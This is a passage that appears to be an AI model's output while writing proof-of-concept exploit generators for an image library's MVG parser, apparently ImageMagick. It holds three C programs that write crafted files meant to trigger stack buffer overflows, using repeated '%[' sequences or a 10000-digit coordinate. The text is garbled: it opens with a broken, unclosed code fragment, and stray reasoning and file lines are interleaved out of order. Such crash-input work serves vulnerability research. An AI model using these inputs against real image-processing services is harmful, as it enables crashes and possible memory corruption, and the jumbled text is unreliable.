#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) {

    fclose(f);

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    /* Flood the input with "%[" sequences to trigger stack buffer overflow */
    /* in the key array during the first "%[" processing. */
    /* The inner loop will consume characters for the key until it has */
    /* copied MaxTextExtent characters, then overflow key[MaxTextExtent] */
    /* with '\\0'. By providing many "%[" without intervening ']' or '\\0', */
    /* we ensure the inner loop consumes many characters as key data. */
    for (int i = 0; i < 10000; i++) {
        fputc('%', f);
        fputc('[', f);
    }
    fputc('\0', f);

    fclose(f);
    return 0;
}
```

   But the parser might convert the string to a number and overflow an integer, not a buffer.

        pop graphic-context

   With a long string of '1's.

   We'll make it 10000 '1's.

   This is a common vulnerability.

   Let's try that.

        We need to write a valid MVG file.

          push graphic-context\n

   Code:

```c
#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    /* Write MVG header */
    fputs("push graphic-context\n", f);
    fputs("point ", f);

    /* Write a very long string of '1's for the x-coordinate */
    for (int i = 0; i < 10000; i++) {
        fputc('1', f);
    }

    /* Write the rest of the point command */
    fputs(",0\n", f);
    fputs("pop graphic-context\n", f);
    fputs("pop graphic-context\n", f);

    fclose(f);
    return 0;
}
```

This is a completely different strategy: we are targeting the MVG parser's coordinate parsing buffer.

Let's hope this triggers a stack buffer overflow in the MVG parser.

Let's output this code.


```c
#include <stdio.h>
#include <stdlib.h>

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) {
        perror("fopen");
        return 1;
    }

    /* Target a potential stack buffer overflow in the MVG parser's coordinate handling */
    /* by providing an extremely long numeric string in a coordinate. */
    /* MVG format: push graphic-context\npoint <x>,<y>\npop graphic-context\npop graphic-context */
    fputs("push graphic-context\n", f);
    fputs("point ", f);
    /* Write a long string of digits to overflow a fixed-size buffer in the coordinate parser */
    for (int i = 0; i < 10000; i++) {
        fputc('1', f);
    }
    fputs(",0\n", f);
    fputs("pop graphic-context\n", f);
    fputs("pop graphic-context\n", f);

    fclose(f);
    return 0;
}
```
